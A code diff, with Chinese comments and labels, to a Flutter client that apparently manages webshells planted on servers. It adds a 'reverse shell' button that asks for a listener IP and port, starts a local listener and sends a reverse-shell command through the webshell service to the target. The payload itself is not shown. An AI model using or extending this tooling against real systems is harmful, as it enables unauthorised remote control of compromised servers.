@@ -4,7 +4,9 @@ import 'package:flutter/foundation.dart';
 
 import '../models/webshell.dart';
 import '../services/webshell_service.dart';
+import '../services/reverse_shell_service.dart';
 import '../theme/app_theme.dart';
+import 'reverse_shell_terminal_page.dart';
 
 // ─── 主页面 ───────────────────────────────────────────────────────────────────
 
@@ -498,6 +500,13 @@ class _TerminalTabState extends State<_TerminalTab>
                   onTap: () => setState(() => _entries.clear()),
                 ),
               const SizedBox(width: 6),
+              // 完整终端（反弹 Shell）按钮
+              _toolbarBtn(
+                icon: Icons.open_in_new,
+                tooltip: '完整终端（反弹 Shell）',
+                onTap: _showReverseShellDialog,
+              ),
+              const SizedBox(width: 6),
               // 模式切换按钮
               _ModeToggle(
                 integrated: _integratedMode,
@@ -520,6 +529,95 @@ class _TerminalTabState extends State<_TerminalTab>
         ),
       ],
     );
+  }
+
+  Future<void> _showReverseShellDialog() async {
+    final ipController = TextEditingController(text: '127.0.0.1');
+    final portController = TextEditingController(text: '4444');
+    final ok = await showDialog<bool>(
+      context: context,
+      builder: (context) {
+        return AlertDialog(
+          title: const Text('启动完整终端（反弹 Shell）'),
+          content: Column(
+            mainAxisSize: MainAxisSize.min,
+            children: [
+              TextField(
+                controller: ipController,
+                decoration: const InputDecoration(
+                  labelText: '监听 IP（LHOST）',
+                ),
+              ),
+              const SizedBox(height: 12),
+              TextField(
+                controller: portController,
+                decoration: const InputDecoration(
+                  labelText: '监听端口（LPORT）',
+                ),
+                keyboardType: TextInputType.number,
+              ),
+              const SizedBox(height: 8),
+              Text(
+                '提示：请确保目标能够主动连接到该 IP/端口。',
+                style: AppTextStyles.caption(
+                  size: 11,
+                  color: AppColors.textSecondary,
+                ),
+              ),
+            ],
+          ),
+          actions: [
+            TextButton(
+              onPressed: () => Navigator.of(context).pop(false),
+              child: const Text('取消'),
+            ),
+            FilledButton(
+              onPressed: () => Navigator.of(context).pop(true),
+              child: const Text('确定'),
+            ),
+          ],
+        );
+      },
+    );
+    if (ok != true) return;
+
+    final lhost = ipController.text.trim();
+    final portStr = portController.text.trim();
+    final lport = int.tryParse(portStr);
+    if (lhost.isEmpty || lport == null) {
+      if (!mounted) return;
+      ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(content: Text('监听 IP 或端口不合法')),
+      );
+      return;
+    }
+
+    final rs = ReverseShellService();
+    rs.onSession = (session) {
+      Navigator.of(context).push(
+        MaterialPageRoute(
+          builder: (_) => ReverseShellTerminalPage(session: session),
+        ),
+      );
+    };
+
+    try {
+      await rs.startListening(port: lport);
+      await widget.service.startReverseShell(lhost, lport);
+      if (!mounted) return;
+      ScaffoldMessenger.of(context).showSnackBar(
+        SnackBar(
+          content: Text('已发送反弹 Shell 命令，等待连接 $lhost:$lport ...'),
+        ),
+      );
+    } catch (e) {
+      if (!mounted) return;
+      ScaffoldMessenger.of(context).showSnackBar(
+        SnackBar(
+          content: Text('启动失败：$e'),
+        ),
+      );
+    }
   }
 
   // ── 模式A：分离式（输出区 + 底部输入栏）────────────────────────────────
@@ -610,18 +708,7 @@ class _TerminalTabState extends State<_TerminalTab>
             style: AppTextStyles.terminal(size: 13, color: AppColors.primary),
           ),
           Expanded(child: _buildInputField()),
-          if (_executing)
-            const Padding(
-              padding: EdgeInsets.only(left: 10),
-              child: SizedBox(
-                width: 13,
-                height: 13,
-                child: CircularProgressIndicator(
-                  strokeWidth: 1.5,
-                  color: AppColors.primary,
-                ),
-              ),
-            ),
+          // 执行进度仅在输出区末尾显示一条“执行中...”行，避免这里重复小进度条
         ],
       ),
     );
